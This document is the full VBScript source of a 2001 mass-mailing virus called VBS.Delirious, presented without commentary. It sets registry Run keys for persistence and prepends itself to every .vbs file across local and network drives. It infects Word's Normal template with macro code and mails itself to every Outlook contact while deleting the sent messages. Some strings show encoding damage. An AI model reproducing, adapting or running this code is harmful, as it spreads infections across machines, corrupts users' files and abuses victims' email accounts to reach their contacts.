'VBS.Delirious
'Written by PetiK on 06/28/2001 in France
On Error Resume Next
Set sf=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set fl=sf.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
Set win=sf.GetSpecialFolder(0)
Set sys=sf.GetSpecialFolder(1)

Set cpy=sf.GetFile(WScript.ScriptFullName)
cpy.Copy(win&"\Delirious.vbs")
r=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire")
ws.RegWrite r,(win&"\Delirious.vbs")

If cpy <> (win&"\Delirious.vbs") Then
MsgBox cpy&" is not a VBS file valid.",vbcritical,cpy
else

Disque()
Word()
Spread()
If Day(Now)=1 Then
MsgBox "Look at my new virus !"??"Delirious, isn't it ??",vbinformation,"VBS.Delirious coded by PetiK (c)2001"
End If

bureau=ws.SpecialFolders("Desktop")
Set link=ws.CreateShortCut(bureau&"\Site_Web.url")
link.TargetPath="http://www.jememarre.com"
link.Save

End If

Sub Disque
If not sf.FileExists (sys&"\DeliriousFile.txt") Then
Set DF=sf.CreateTextFile(sys&"\DeliriousFile.txt")
DF.WriteLine "Infected file by VBS.Delirious"
DF.WriteLine "Fichiers infect?s par VBS.Delirious :"
DF.WriteBlankLines(1)
DF.Close
End If
Set dr=sf.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
liste(d.path&"\")
End If
Next
End Sub
Sub infection(dossier)
Set f=sf.GetFolder(dossier)
Set fc=f.Files
For Each F in fc
ext=sf.GetExtensionName(F.path)
ext=lcase(ext)
If (ext="vbs") Then
Set verif=sf.OpenTextFile(F.path, 1, False)
If verif.ReadLine <> "'VBS.Delirious" Then
tout=verif.ReadAll()
verif.Close
Set inf=sf.OpenTextFile(F.path, 2, True)
inf.Write(virus)
inf.Write(tout)
inf.Close
Set DF=sf.OpenTextFile(sys&"\DeliriousFile.txt", 8, True)
DF.WriteLine F.path
DF.Close
End If
End If
Next
End Sub
Sub liste(dossier)
Set f=sf.GetFolder(dossier)
Set sd=f.SubFolders
For Each F in sd
infection(F.path)
liste(F.path)
Next
End Sub

Sub Word()
On Error Resume Next
Set CODE=sf.CreateTextFile(sys&"\DeliriousCode.txt")
CODE.Write(virus)
CODE.Close
If ws.RegRead("HKLM\Software\Microsoft\Delirious\InfectNormal") <> "OK" Then
Set wrd=WScript.CreateObject("Word.Application")
wrd.Visible=False
Set NorT=wrd.NormalTemplate.VBProject.VBComponents
NorT.Import sys&"\DeliriousCode.txt"
wrd.Run "Normal.ThisDocument.AutoExec"
wrd.Quit
ws.RegWrite "HKLM\Software\Microsoft\Delirious\InfectNormal","OK" 
End If
End Sub

Sub Spread()
WHO=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
Set OA=CreateObject("Outlook.Application")
Set MA=OA.GetNameSpace("MAPI")
For Each C In MA.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set AD=C.AddressEntries(D)
Set EM=OA.CreateItem(0)
EM.To=AD.Address
EM.Subject="Delirious EMail from " & WHO
body="Hi " & AD.Name & ","
body = body & VbCrLf & "Look at this funny attached."
body = body & VbCrLf & ""
body = body & VbCrLf & "	Best Regards " & WHO
EM.Body=body
EM.Attachments.Add(win&"\Delirious.vbs")
EM.DeleteAfterSubmit=True
If EM.To <> "" Then
EM.Send
End If
Next
End If
Next
End Sub